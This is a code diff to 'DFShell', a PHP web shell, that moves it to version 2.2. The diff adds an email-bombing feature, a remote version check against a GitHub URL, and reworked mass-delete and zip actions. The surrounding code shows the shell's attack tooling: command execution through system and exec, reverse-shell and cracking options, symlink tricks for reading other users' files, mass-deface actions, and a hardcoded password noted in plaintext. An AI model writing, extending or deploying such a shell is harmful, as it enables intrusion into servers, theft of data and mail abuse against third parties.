@@ -15,13 +15,13 @@ error_reporting(0);
 // creating session
 
 session_start();
-$DFShell_Ver = 1.0;
+$DFShell_Ver = 2.2;
 $DFConfig = array($_REQUEST,$_POST,$_SERVER,$_COOKIE,$_FILES);
 $DFSyntax = array("file_get_contents","fileperms","readfile","chdir","getcwd","function_exists","fsockopen","pcntl_fork",
 "stream_set_blocking","proc_get_status","proc_open","proc_close","posix_setsid","stream_select","stream_get_contents","posix_getpwuid"); // $GLOBALS['DFSyntax']
 $DFSCmd = array("system","shell_exec","exec","passthru","proc_open");
 $DFSPlatform = strtolower(substr(PHP_OS,0,3));
-$DFSOptions = array("edit","cmd","del","sql","conf","sym","reverse","crack","mass","logout","dest","ren","chmd","unzip");
+$DFSOptions = array("edit","cmd","del","sql","conf","sym","reverse","crack","mass","logout","dest","ren","chmd","unzip","bombing");
 
 #new update will use chdir(); function
 #readlink("symlink_file"),lchgrp(symlink_file, uid),lchown(symlink_file, 8) function
@@ -50,6 +50,14 @@ class DFShell{
     static protected $pass = "OI2lo2eG+xkgYPhmurVfWAsDHBx31O1qAoH2J2LkX7c="; //DF_Malaysia@1337$
     static protected $remote_url = "https://raw.githubusercontent.com/EagleTube/DFS/main/contents";
     
+    public function __construct(){
+        $_SESSION['latest'] = $GLOBALS['DFSyntax'][0](self::$remote_url . "/version.txt");
+        $_SESSION['need_update'] = false;
+        if(doubleval($_SESSION['latest'])!==$GLOBALS['DFShell_Ver']){
+            $_SESSION['need_update'] = true;
+        }
+    }
+
     public function DFSPopupMSG($no,$title,$msg,$foot,$x){
         if($x){
             $location = "window.location.replace(window.location.href)";
@@ -354,26 +362,80 @@ class DFShell{
                     }
                 }
             break;
+            case "bombing":
+
+                echo "<div class='bombing'>
+                <h3>Email Bombing</h3>
+                <form action='' method='POST'>
+                <table>
+                    <tr>
+                        <td colspan='2'><input type='text' name='mail_subject' placeholder='Subject'></td>
+                    </tr>
+                    <tr>
+                        <td><textarea name='mail_list' placeholder='email@list.com'></textarea></td>
+                        <td><textarea name='mail_text' placeholder='Message Text'></textarea></td>
+                    </tr>
+                    </tr>
+                        <td colspan='2'><button>SEND MAIL</button></td>
+                    </tr>
+                </table>
+                </form>
+                ";
+
+                if(isset($GLOBALS['DFConfig'][1]['mail_list']) && isset($GLOBALS['DFConfig'][1]['mail_text'])){
+                    $emails = explode("\n",$GLOBALS['DFConfig'][1]['mail_list']);
+                    $message = $GLOBALS['DFConfig'][1]['mail_text'];
+                    $subject = $GLOBALS['DFConfig'][1]['mail_subject'];
+                    $headers = "From: ".$GLOBALS['DFConfig'][2]['SERVER_ADMIN'];
+                    foreach($emails as $email){
+                        $email = preg_replace("/\s+/i","",$email);
+                        if(@mail($email,$subject,$txt,$headers)){
+                            print("<font color='green'>Email sent -> ".$email."</font><br>");
+                        }else{
+                            print("<font color='red'>Failed -> ".$email."</font><br>");
+                        }
+                    }
+                }
+                echo "</div>";
+            break;
             case "massdel":
                 //upcoming
-                if(isset($GLOBALS['DFConfig'][1]['massdel'])){
+                if(isset($GLOBALS['DFConfig'][1]['selectAction'])){
+                    if($GLOBALS['DFConfig'][1]['selectAction']==="Delete")
                     if(!empty($GLOBALS['DFConfig'][1]['toZip'])){
+
+                        if(isset($GLOBALS['DFConfig'][0]['dfp'])){
+                            $delPath = $this->Dec($GLOBALS['DFConfig'][0]['dfp']) . $slashtype;
+                        }else{
+                            $delPath = "";
+                        }
+
                         $toDel = $GLOBALS['DFConfig'][1]['toZip'];
-                        foreach($toDel as $td){
-                            if(is_dir($td)){
-                                @rmdir($td);
-                            }else{
-                                @unlink($td);
+
+                        for($i=0;$i<count($toDel);$i++){
+                            $mdel = explode("||",$toDel[$i]);
+                            $mdel_dir = $this->Dec(urldecode($mdel[0]));
+                            $mdel_item = $this->Dec(urldecode($mdel[1]));
+                            if(file_exists($mdel_dir . $mdel_item)){
+                                if(is_dir($mdel_dir . $mdel_item)){
+                                    @rmdir($mdel_dir . $mdel_item);
+                                }
+                                if(is_file($mdel_dir . $mdel_item)){
+                                    @unlink($mdel_dir . $mdel_item);
+                                }
                             }
                         }
-                        echo "<script>alert('Selected file deleted!');window.location.replace(window.location.href);</script>";
+                        $this->DFSPopupMSG(3,null,"Selected file deleted!",null,true);
+                    }else{
+                        $this->DFSPopupMSG(4,null,"No file deleted!",null,true);
                     }
                 }
             break;
             case "zipping":
                 $ziproc = new ZipArchive;
                 $slashtype = $this->DFSSlash();
-                if(isset($GLOBALS['DFConfig'][1]['zipfile'])){
+                if(isset($GLOBALS['DFConfig'][1]['selectAction'])){
+                    if($GLOBALS['DFConfig'][1]['selectAction']==="Zip")
                     if(empty($GLOBALS['DFConfig'][1]['toZip'])){
                         print("<script>alert('You have to pick a file');</script>");
                     }else{
@@ -533,7 +595,7 @@ class DFShell{
                                 if(!file_exists($GLOBALS['DFConfig'][1]['path'].'/sym/'.$nothing['name'])){
                                     mkdir($GLOBALS['DFConfig'][1]['path'].'/sym/'.$nothing['name']);
 
-                                    $targetpath = $this->DFSRender('/%{user}%/i',$nothing['name'],$GLOBALS['DFConfig'][1]['target']);
+                                    $targetpath = $this->DFSRender('/%{user}%/i',$nothing['name'],$this->Dec(urldecode($GLOBALS['DFConfig'][1]['target'])));
 
                                     if(isset($targetpath)){
                                         $this->DFSExecute("ln -s ".$targetpath.' '.$GLOBALS['DFConfig'][1]['path'].'/sym/'.$nothing['name'].'/'.$GLOBALS['DFConfig'][1]['dfsaved']); 
@@ -547,7 +609,7 @@ class DFShell{
                                         print("Done! -> ".$nothing['name']." -> <a href='".urldecode($dfsv)."'>Open</a><br>");
                                     }
                                 }else{
-                                    $targetpath = $this->DFSRender('/%{user}%/i',$nothing['name'],$GLOBALS['DFConfig'][1]['target']);
+                                    $targetpath = $this->DFSRender('/%{user}%/i',$nothing['name'],$this->Dec(urldecode($GLOBALS['DFConfig'][1]['target'])));
 
                                     if(isset($targetpath)){
                                         $this->DFSExecute("ln -s ".$targetpath.' '.$GLOBALS['DFConfig'][1]['path'].'/sym/'.$nothing['name'].'/'.$GLOBALS['DFConfig'][1]['dfsaved']); 
@@ -686,7 +748,16 @@ class DFShell{
                         <a href='?dfp=".urlencode($dfp)."&dfd=".urlencode($dff)."&dfaction=download'><i class='fa-solid fa-download'></i></a></td></tr></p>";
                     }
                 }
-                echo "</table><div id='anact'><input type='submit' name='zipfile' value='Zip'></div></form></div>";
+                echo "</table>
+                <div id='anact'>
+
+                <select name='selectAction'>
+                <option value=''>-- Action --</option>
+                <option value='Zip'>-- Zip --</option>
+                <option value='Delete'>-- Delete --</option>
+                </select>
+                <input type='submit' value='Submit'>
+                </div></form></div>";
 
             break;
             case "del":
@@ -1289,7 +1360,7 @@ Document Root : ".$GLOBALS['DFConfig'][2]['DOCUMENT_ROOT']." | Disk : ".$disklin
     }
     public function DFStart(){
         $contents = $GLOBALS['DFSyntax'][0](self::$remote_url . "/head.html");
-        $contents = preg_replace('/%{style}%/i',$GLOBALS['DFSyntax'][0](self::$remote_url . "/dfs.css"),$contents); //example
+        $contents = preg_replace('/%{style}%/i',$GLOBALS['DFSyntax'][0]("css/dfs.css"),$contents); //example
         $contents = preg_replace('/%{js}%/i',$GLOBALS['DFSyntax'][0](self::$remote_url . "/script.js"),$contents);
         return $contents;
     }
@@ -1361,7 +1432,7 @@ if(!isset($_SESSION['DFS_Auth']) || empty($_SESSION['DFS_Auth'])){
 
         $toReplace = array($GLOBALS['DFConfig'][2]['PHP_SELF'],"?dfaction=conf","?dfaction=reverse",
                           "?dfaction=sym","?dfaction=crack",$cmdx,"?dfaction=mass","?dfaction=sql",
-                          "?dfaction=dest","?dfaction=logout");
+                          "?dfaction=dest","?dfaction=bombing","?dfaction=logout");
 
         $contents = $shell->DFSRender("/%{body}%/i","%{DFSI}%",$contents);
         $contents = $shell->DFSRender("/%{DFSI}%/i",$chead,$contents);
@@ -1416,6 +1487,13 @@ if(!isset($_SESSION['DFS_Auth']) || empty($_SESSION['DFS_Auth'])){
         $shell->DFSAction("zipping");
         $shell->DFSAction("massdel");
         $footer = $shell->DFSEnd();
+        preg_match('/[0-9]\.[0-9]/i',$_SESSION['latest'],$match);
+        $latestVersion = "V".($match[0]);
+        if($_SESSION['need_update']){
+            echo "<script>
+            alert('New version available!\\nLatest version : ".$latestVersion."')
+            </script>";
+        }
         print($footer);
     }
 }?>
